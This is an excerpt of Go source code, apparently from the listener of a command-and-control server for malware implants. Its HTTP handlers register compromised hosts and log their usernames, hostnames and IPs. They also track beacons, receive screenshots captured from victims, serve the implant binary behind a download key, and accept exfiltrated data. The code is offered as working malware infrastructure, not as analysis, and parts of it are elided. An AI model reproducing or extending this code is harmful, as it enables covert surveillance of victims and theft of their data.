...
func (m *Manager) Start(l *db.Listener) error {
	...
	hl.server = &http.Server{
		Addr:     addr,
		Handler:  hl.mux,
		ErrorLog: log.New(silentLogger{}, "", 0),
	}
...
func (hl *HTTPListener) handleRegister(w http.ResponseWriter, r *http.Request) {
	...
	if err := db.SaveImplant(&meta, clientIP); err != nil {
		fmt.Printf("[!] failed to save implant: %v\n", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	fmt.Printf("[+] new implant: %s@%s (%s) pid:%d ip:%s\n", meta.Username, meta.Hostname, meta.ID[:8], meta.PID, clientIP)
...
func (hl *HTTPListener) handleBeacon(w http.ResponseWriter, r *http.Request) {
	...
	clientIP := getClientIP(r)
	if err := db.UpdateImplantLastSeen(beacon.ImplantID, clientIP); err != nil {
...
func (hl *HTTPListener) handleScreenshot(w http.ResponseWriter, r *http.Request) {
	...
	clientIP := getClientIP(r)
	task, err := db.GetPendingScreenshotTaskByIP(clientIP)
	if err != nil || task == nil {
		fmt.Printf("[!] screenshot rejected: no pending task for IP %s\n", clientIP)
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	filename := fmt.Sprintf("screenshot_%s.jpg", task.ID[:8])
	...
	fmt.Printf("[+] received screenshot for task %s: %s (%d bytes)\n", task.ID[:8], filename, len(body))
...
func (hl *HTTPListener) handleImplant(w http.ResponseWriter, r *http.Request) {
	if DownloadKey != "" {
		providedKey := r.Header.Get("X-Download-Key")
		if providedKey != DownloadKey {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}
...
func (hl *HTTPListener) handleExfil(w http.ResponseWriter, r *http.Request) {
	...
	implant, err := db.GetImplant(implantID)
	if err != nil || implant == nil {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
